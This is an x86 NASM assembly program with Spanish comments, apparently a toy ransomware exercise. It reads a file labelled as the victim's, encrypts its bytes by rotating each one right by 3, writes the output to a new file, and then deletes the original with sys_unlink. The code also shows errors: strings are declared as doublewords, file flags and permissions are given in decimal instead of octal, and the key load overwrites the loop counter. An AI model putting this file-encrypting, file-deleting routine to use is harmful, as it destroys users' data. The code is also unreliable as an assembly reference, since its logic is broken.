GLOBAL main

section .data
    archVictima DD "archivoV.txt", 0
    archCifrado DD "archivoCifrado.txt", 0
    tama_buffer EQU 50
    key DD 3

section .bss
    fd_lectura resw 1
    fd_cifrado resw 1
    buffer resb tama_buffer

section .text 
    main:
        ;Abrimos el archivo de lectura
        mov eax, 5              ;sys_open
        mov ebx, archVictima
        mov ecx, 0            ; El archivo se abrira en modo lectura
        mov edx, 777              ;Cuenta con todos los permisos rwx
        int 0x80

        mov [fd_lectura], eax   ;Guardamos el identificador de archivo de lectura

        ;Abrimos el archivo de cifrado
        mov eax, 5              ;sys_open
        mov ebx, archCifrado
        mov ecx, 641            ;(modo de escritura, crear si no existe)
        mov edx, 777            ;Asignando todos los permisos
        int 0x80

        mov [fd_cifrado], eax   ;Guardamos el identificador de archivo de cifrado

        ;Leer el contenido del archivo
        mov eax, 3
        mov ebx, [fd_lectura]
        mov ecx, buffer
        mov edx, tama_buffer
        int 0x80                ;Aqui basicamente Leemos contenido del archivo

        ;Cifrar contenido
        mov esi, buffer        ;Puntero al inicio del buffer
        mov ecx, 0          ;Contador de posición inicializado en 0

    cifrar_loop:
        movzx eax, byte [esi]  ;Cargamos el caracter actual en AL
        cmp al, 0              ;VVerificamos si se llegó al final del archivo
        je fin_cifrar          ;De ser el final del archivo, salta a fin_cifrar

        mov cl, byte [key]     ;Cargmos el valor de "key" en CL
        ror al, cl             ;Rotamos a la derecha el valor de AL según CL->cl tiene un 3
        mov byte [esi], al    ;Guardamos el caracter cifrado en el buffer

        inc esi               ;Avanzamos al siguiente caracter en el buffer
        inc ecx               ;Incrementamos el contador de posición

        cmp ecx, edx          ;Comparamos el contador con el tamaño del buffer
        jl cifrar_loop        ;Si no se ha llegado al final del buffer, continua en el ciclo

    fin_cifrar:
        ;Escribiendo el contenido cifrado en el archivo de cifrado
        mov eax, 4              ;sys_write
        mov ebx, [fd_cifrado]
        mov ecx, buffer
        mov edx, tama_buffer
        int 0x80                ;Escribimos el contenido cifrado en el archivo de cifrado

        ;Cerramos el archivo de lectura
        mov eax, 6              ;sys_close
        mov ebx, [fd_lectura]
        int 0x80

        ;Cerramos el archivo de cifrado
        mov eax, 6              ;sys_close
        mov ebx, [fd_cifrado]
        int 0x80

        ;Eliminamos el archivo original->Archivo de a victima
        mov eax, 10             ;sys_unlink
        mov ebx, archVictima
        int 0x80

        mov eax, 1              ;Fin del programa
        int 0x80
